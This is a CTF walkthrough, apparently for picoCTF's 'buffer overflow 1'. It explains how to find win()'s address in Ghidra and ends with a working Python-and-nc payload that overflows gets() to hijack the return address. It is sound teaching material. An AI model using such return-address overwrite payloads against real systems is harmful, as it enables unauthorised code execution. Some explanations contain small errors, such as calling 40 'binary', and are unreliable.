----------------------------------------------------------
Description
Control the return address 
Now we're cooking! 
You can overflow the buffer and return to the flag function in the program. 
You can view source here. 
And connect with it using nc saturn.picoctf.net 60853
----------------------------------------------------------

1. Run the instance

2. Download the program 'vuln' and the source code 'vuln.c'
    
3. Run the app with 'nc saturn.picoctf.net 60853'
    - Please enter your string: 
        - test
    - Okay, time to return... Fingers Crossed... Jumping to 0x804932f
    
    ONE MORE TRY (test, if the jumped address changes with different input string)
    - Please enter your string: 
        - jahfnlkanbvoa
    - Okay, time to return... Fingers Crossed... Jumping to 0x804932f
    
    JUMPED ADDRESS IS THE SAME
    
4. Inspect the code of 'vuln.c'
    - our goat is to overflow the gets(buf) on line 26 to call the first function win()
        - it prints us the flag that is saved in "flag.txt" file... 
    - define BUFSIZE 32 is big enought to enter long input
    - main function consists of:
        - setvbuf
        - puts to show the challenge for user to give it an input string
            - user input string is then saved under vuln()
                - vuln() is void 
                
5. inspect the addresses in some dissasembler
    - GHIDRA
        - Installing Ghidra
            - sudo apt-get install openjdk-17-jdk
            - download the source Ghidra file
            - chmod +x ghidraRun
            - ./ghidraRun
                - I agree
        - Ghidra is overkill for this challenge, its tool CodeBrowser is sufficient
            - open the 'vuln; source file in CodeBrowser and auto-analyze it
              
    - CodeBrowser
        - left column - Symbol Tree - Functions
        - win() function
            - address: 080491f6
                - that is the address we need to get to obtain flag
        - vuln() function
             - inside of vuln is gets function we need to modify to bring us to win()
                -   08049297 83 ec 0c        SUB        ESP,0xc
                    0804929a 8d 45 d8        LEA        EAX=>local_2c,[EBP + -0x28]
                    0804929d 50              PUSH       EAX
                    0804929e e8 ad fd        CALL       <EXTERNAL>::gets                                 char * gets(char * __s)
                            ff ff
                - EAX=>local_2c,[EBP + -0x28]
                    - EAX is gotten by EBP add to -0x28
                        - 0x28 in hex == 40 in binary
                        
                        
6. Overflow the given app
    - python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08'+b'\n')" | nc saturn.picoctf.net 60853
        - import sys
            - importing needed sis library
        - sys.stdout.buffer.write
            - for overwriting the address in buffer
        - b'A'*44+b'\xf6\x91\x04\x08'+b'\n'
            - 'A'*44
                - shortcut for 44 times A character 
                    - in vuln() there is the EBP + -0x28 as we already know ... 4 + 40 ... we need to obtain 44 chars of for example A
            - \xf6\x91\x04\x08 is backwards address we want to obtain (address of win() function)
                - 080491f6
        - nc saturn.picoctf.net 60853
            - for connecting to the given app
    - we obtained the flag :-)

        
